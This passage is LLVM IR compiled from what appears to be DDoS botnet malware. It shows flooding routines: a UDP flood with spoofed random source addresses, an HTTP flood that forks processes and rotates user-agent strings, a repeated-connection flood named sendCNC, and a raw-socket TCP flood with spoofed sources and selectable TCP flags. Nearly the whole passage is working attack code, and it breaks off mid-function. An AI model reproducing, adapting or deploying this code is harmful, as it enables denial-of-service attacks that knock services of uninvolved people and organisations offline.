113:                                              ; preds = %67
  %114 = load i32, i32* %8, align 4
  %115 = trunc i32 %114 to i16
  %116 = call zeroext i16 @htons(i16 zeroext %115) #15
  %117 = zext i16 %116 to i32
  br label %118

118:                                              ; preds = %113, %111
  %119 = phi i32 [ %112, %111 ], [ %117, %113 ]
  %120 = trunc i32 %119 to i16
  %121 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %122 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon.1* %122 to %struct.anon.3*
  %124 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %123, i32 0, i32 1
  store i16 %120, i16* %124, align 2
  %125 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %126 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %125, i32 0, i32 0
  %127 = bitcast %union.anon.1* %126 to %struct.anon.3*
  %128 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %127, i32 0, i32 3
  store i16 0, i16* %128, align 2
  %129 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %130 = bitcast %struct.udphdr* %129 to i8*
  %131 = getelementptr inbounds i8, i8* %130, i64 8
  %132 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %131, i32 %132)
  %133 = bitcast i8* %77 to i16*
  %134 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 2
  %136 = load i16, i16* %135, align 2
  %137 = zext i16 %136 to i32
  %138 = call zeroext i16 @csum(i16* %133, i32 %137)
  %139 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 7
  store i16 %138, i16* %140, align 2
  %141 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %142 = load i32, i32* %9, align 4
  %143 = add nsw i32 %141, %142
  store i32 %143, i32* %23, align 4
  store i32 0, i32* %24, align 4
  br label %144

144:                                              ; preds = %197, %196, %118
  br label %145

145:                                              ; preds = %144
  %146 = load i32, i32* %15, align 4
  %147 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %148 = call i64 @sendto(i32 %146, i8* %77, i64 %75, i32 0, %struct.sockaddr* %147, i32 16)
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  %151 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %152 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %151, i32 0, i32 0
  %153 = bitcast %union.anon.1* %152 to %struct.anon.3*
  %154 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %153, i32 0, i32 0
  store i16 %150, i16* %154, align 2
  %155 = load i32, i32* %8, align 4
  %156 = icmp eq i32 %155, 0
  br i1 %156, label %157, label %159

157:                                              ; preds = %145
  %158 = call i32 @rand_cmwc()
  br label %164

159:                                              ; preds = %145
  %160 = load i32, i32* %8, align 4
  %161 = trunc i32 %160 to i16
  %162 = call zeroext i16 @htons(i16 zeroext %161) #15
  %163 = zext i16 %162 to i32
  br label %164

164:                                              ; preds = %159, %157
  %165 = phi i32 [ %158, %157 ], [ %163, %159 ]
  %166 = trunc i32 %165 to i16
  %167 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.1* %168 to %struct.anon.3*
  %170 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %169, i32 0, i32 1
  store i16 %166, i16* %170, align 2
  %171 = call i32 @rand_cmwc()
  %172 = trunc i32 %171 to i16
  %173 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i32, i32* %18, align 4
  %176 = call i32 @getRandomIP(i32 %175)
  %177 = call i32 @htonl(i32 %176) #15
  %178 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = bitcast i8* %77 to i16*
  %181 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 2
  %183 = load i16, i16* %182, align 2
  %184 = zext i16 %183 to i32
  %185 = call zeroext i16 @csum(i16* %180, i32 %184)
  %186 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 7
  store i16 %185, i16* %187, align 2
  %188 = load i32, i32* %24, align 4
  %189 = load i32, i32* %14, align 4
  %190 = icmp eq i32 %188, %189
  br i1 %190, label %191, label %197

191:                                              ; preds = %164
  %192 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %193 = load i32, i32* %23, align 4
  %194 = icmp sgt i32 %192, %193
  br i1 %194, label %195, label %196

195:                                              ; preds = %191
  br label %200

196:                                              ; preds = %191
  store i32 0, i32* %24, align 4
  br label %144

197:                                              ; preds = %164
  %198 = load i32, i32* %24, align 4
  %199 = add i32 %198, 1
  store i32 %199, i32* %24, align 4
  br label %144

200:                                              ; preds = %195
  %201 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %201)
  br label %202

202:                                              ; preds = %200, %56, %50, %42
  ret void
}

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #8

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @socket_connect(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

14:                                               ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #12
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #15
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #12
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #12
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

37:                                               ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

43:                                               ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

45:                                               ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #5

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendHTTP(i8* %0, i8* %1, i16 zeroext %2, i8* %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %20 = load i32, i32* %11, align 4
  %21 = add nsw i32 %19, %20
  store i32 %21, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %22

22:                                               ; preds = %64, %6
  %23 = load i32, i32* %14, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %67

26:                                               ; preds = %22
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %28 = load i8*, i8** %7, align 8
  %29 = load i8*, i8** %10, align 8
  %30 = load i8*, i8** %8, align 8
  %31 = call i32 @rand() #12
  %32 = srem i32 %31, 36
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [36 x i8*], [36 x i8*]* @uastrings, i64 0, i64 %33
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.82, i64 0, i64 0), i8* %28, i8* %29, i8* %30, i8* %35) #12
  %37 = call i32 @fork() #12
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %63

39:                                               ; preds = %26
  br label %40

40:                                               ; preds = %61, %39
  %41 = load i32, i32* %15, align 4
  %42 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %43 = icmp sgt i32 %41, %42
  br i1 %43, label %44, label %62

44:                                               ; preds = %40
  %45 = load i8*, i8** %8, align 8
  %46 = load i16, i16* %9, align 2
  %47 = call i32 @socket_connect(i8* %45, i16 zeroext %46)
  store i32 %47, i32* %13, align 4
  %48 = load i32, i32* %13, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %50, label %61

50:                                               ; preds = %44
  %51 = load i32, i32* %13, align 4
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %54 = call i64 @strlen(i8* %53) #11
  %55 = call i64 @write(i32 %51, i8* %52, i64 %54)
  %56 = load i32, i32* %13, align 4
  %57 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i64 0, i64 0
  %58 = call i64 @read(i32 %56, i8* %57, i64 1)
  %59 = load i32, i32* %13, align 4
  %60 = call i32 @close(i32 %59)
  br label %61

61:                                               ; preds = %50, %44
  br label %40, !llvm.loop !40

62:                                               ; preds = %40
  call void @exit(i32 0) #16
  unreachable

63:                                               ; preds = %26
  br label %64

64:                                               ; preds = %63
  %65 = load i32, i32* %14, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %14, align 4
  br label %22, !llvm.loop !41

67:                                               ; preds = %22
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i64 @write(i32, i8*, i64) #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) #10

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendCNC(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #12
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #15
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

22:                                               ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

26:                                               ; preds = %22
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* %29, i32 16)
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 %32)
  br label %22, !llvm.loop !42

34:                                               ; preds = %22
  ret void
}

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendTCP(i8* %0, i32 %1, i32 %2, i8* %3, i32 %4, i32 %5, i32 %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %13, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #15
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %333

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 2, i32 3, i32 6) #12
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %53, label %52

52:                                               ; preds = %46
  br label %333

53:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %54 = load i32, i32* %17, align 4
  %55 = bitcast i32* %18 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #12
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %59

58:                                               ; preds = %53
  br label %333

59:                                               ; preds = %53
  %60 = load i32, i32* %14, align 4
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

62:                                               ; preds = %59
  store i32 0, i32* %19, align 4
  br label %69

63:                                               ; preds = %59
  %64 = load i32, i32* %14, align 4
  %65 = sub nsw i32 32, %64
  %66 = shl i32 1, %65
  %67 = sub nsw i32 %66, 1
  %68 = xor i32 %67, -1
  store i32 %68, i32* %19, align 4
  br label %69

69:                                               ; preds = %63, %62
  %70 = load i32, i32* %12, align 4
  %71 = sext i32 %70 to i64
  %72 = add i64 40, %71
  %73 = call i8* @llvm.stacksave()
  store i8* %73, i8** %20, align 8
  %74 = alloca i8, i64 %72, align 16
  store i64 %72, i64* %21, align 8
  %75 = bitcast i8* %74 to %struct.iphdr*
  store %struct.iphdr* %75, %struct.iphdr** %22, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %77 = bitcast %struct.iphdr* %76 to i8*
  %78 = getelementptr i8, i8* %77, i64 20
  %79 = bitcast i8* %78 to %struct.tcphdr*
  store %struct.tcphdr* %79, %struct.tcphdr** %23, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = load i32, i32* %19, align 4
  %85 = call i32 @getRandomIP(i32 %84)
  %86 = call i32 @htonl(i32 %85) #15
  %87 = load i32, i32* %12, align 4
  %88 = sext i32 %87 to i64
  %89 = add i64 20, %88
  %90 = trunc i64 %89 to i32
  call void @makeIPPacket(%struct.iphdr* %80, i32 %83, i32 %86, i8 zeroext 6, i32 %90)
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  %93 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %94 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %93, i32 0, i32 0
  %95 = bitcast %union.anon* %94 to %struct.anon.0*
  %96 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %95, i32 0, i32 0
  store i16 %92, i16* %96, align 4
  %97 = call i32 @rand_cmwc()
  %98 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 0
  %100 = bitcast %union.anon* %99 to %struct.anon.0*
  %101 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %100, i32 0, i32 2
  store i32 %97, i32* %101, align 4
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 3
  store i32 0, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 4
  %110 = load i16, i16* %109, align 4
  %111 = and i16 %110, -241
  %112 = or i16 %111, 80
  store i16 %112, i16* %109, align 4
  %113 = load i8*, i8** %11, align 8
  %114 = call i32 @strcmp(i8* %113, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i64 0, i64 0)) #11
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %152, label %116

116:                                              ; preds = %69
  %117 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon* %118 to %struct.anon.0*
  %120 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %119, i32 0, i32 4
  %121 = load i16, i16* %120, align 4
  %122 = and i16 %121, -513
  %123 = or i16 %122, 512
  store i16 %123, i16* %120, align 4
  %124 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon* %125 to %struct.anon.0*
  %127 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %126, i32 0, i32 4
  %128 = load i16, i16* %127, align 4
  %129 = and i16 %128, -1025
  %130 = or i16 %129, 1024
  store i16 %130, i16* %127, align 4
  %131 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon* %132 to %struct.anon.0*
  %134 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %133, i32 0, i32 4
  %135 = load i16, i16* %134, align 4
  %136 = and i16 %135, -257
  %137 = or i16 %136, 256
  store i16 %137, i16* %134, align 4
  %138 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon* %139 to %struct.anon.0*
  %141 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %140, i32 0, i32 4
  %142 = load i16, i16* %141, align 4
  %143 = and i16 %142, -4097
  %144 = or i16 %143, 4096
  store i16 %144, i16* %141, align 4
  %145 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 0
  %147 = bitcast %union.anon* %146 to %struct.anon.0*
  %148 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %147, i32 0, i32 4
  %149 = load i16, i16* %148, align 4
  %150 = and i16 %149, -2049
  %151 = or i16 %150, 2048
  store i16 %151, i16* %148, align 4
  br label %226

152:                                              ; preds = %69
  %153 = load i8*, i8** %11, align 8
  %154 = call i8* @strtok(i8* %153, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %154, i8** %24, align 8
  br label %155

155:                                              ; preds = %223, %152
  %156 = load i8*, i8** %24, align 8
  %157 = icmp ne i8* %156, null
  br i1 %157, label %158, label %225

158:                                              ; preds = %155
  %159 = load i8*, i8** %24, align 8
  %160 = call i32 @strcmp(i8* %159, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i64 0, i64 0)) #11
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %170, label %162

162:                                              ; preds = %158
  %163 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon* %164 to %struct.anon.0*
  %166 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %165, i32 0, i32 4
  %167 = load i16, i16* %166, align 4
  %168 = and i16 %167, -513
  %169 = or i16 %168, 512
  store i16 %169, i16* %166, align 4
  br label %223

170:                                              ; preds = %158
  %171 = load i8*, i8** %24, align 8
  %172 = call i32 @strcmp(i8* %171, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0)) #11
  %173 = icmp ne i32 %172, 0
  br i1 %173, label %182, label %174

174:                                              ; preds = %170
  %175 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %176 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon* %176 to %struct.anon.0*
  %178 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %177, i32 0, i32 4
  %179 = load i16, i16* %178, align 4
  %180 = and i16 %179, -1025
  %181 = or i16 %180, 1024
  store i16 %181, i16* %178, align 4
  br label %222

182:                                              ; preds = %170
  %183 = load i8*, i8** %24, align 8
  %184 = call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i64 0, i64 0)) #11
  %185 = icmp ne i32 %184, 0
  br i1 %185, label %194, label %186

186:                                              ; preds = %182
  %187 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon* %188 to %struct.anon.0*
  %190 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -257
  %193 = or i16 %192, 256
  store i16 %193, i16* %190, align 4
  br label %221

194:                                              ; preds = %182
  %195 = load i8*, i8** %24, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i64 0, i64 0)) #11
  %197 = icmp ne i32 %196, 0
  br i1 %197, label %206, label %198

198:                                              ; preds = %194
  %199 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon* %200 to %struct.anon.0*
  %202 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %201, i32 0, i32 4
  %203 = load i16, i16* %202, align 4
  %204 = and i16 %203, -4097
  %205 = or i16 %204, 4096
  store i16 %205, i16* %202, align 4
  br label %220

206:                                              ; preds = %194
  %207 = load i8*, i8** %24, align 8
  %208 = call i32 @strcmp(i8* %207, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #11
  %209 = icmp ne i32 %208, 0
  br i1 %209, label %218, label %210

210:                                              ; preds = %206
  %211 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon* %212 to %struct.anon.0*
  %214 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %215, -2049
  %217 = or i16 %216, 2048
  store i16 %217, i16* %214, align 4
  br label %219

218:                                              ; preds = %206
  br label %219

219:                                              ; preds = %218, %210
  br label %220

220:                                              ; preds = %219, %198
  br label %221

221:                                              ; preds = %220, %186
  br label %222

222:                                              ; preds = %221, %174
  br label %223

223:                                              ; preds = %222, %162
  %224 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %224, i8** %24, align 8
  br label %155, !llvm.loop !43

225:                                              ; preds = %155
  br label %226

226:                                              ; preds = %225, %116
  %227 = call i32 @rand_cmwc()
  %228 = trunc i32 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon* %230 to %struct.anon.0*
  %232 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %231, i32 0, i32 5
  store i16 %228, i16* %232, align 2
  %233 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = bitcast %union.anon* %234 to %struct.anon.0*
  %236 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %235, i32 0, i32 6
  store i16 0, i16* %236, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon* %238 to %struct.anon.0*
  %240 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %239, i32 0, i32 7
  store i16 0, i16* %240, align 2
  %241 = load i32, i32* %9, align 4
  %242 = icmp eq i32 %241, 0
  br i1 %242, label %243, label %245

243:                                              ; preds = %226
  %244 = call i32 @rand_cmwc()
  br label %250

245:                                              ; preds = %226
  %246 = load i32, i32* %9, align 4
  %247 = trunc i32 %246 to i16
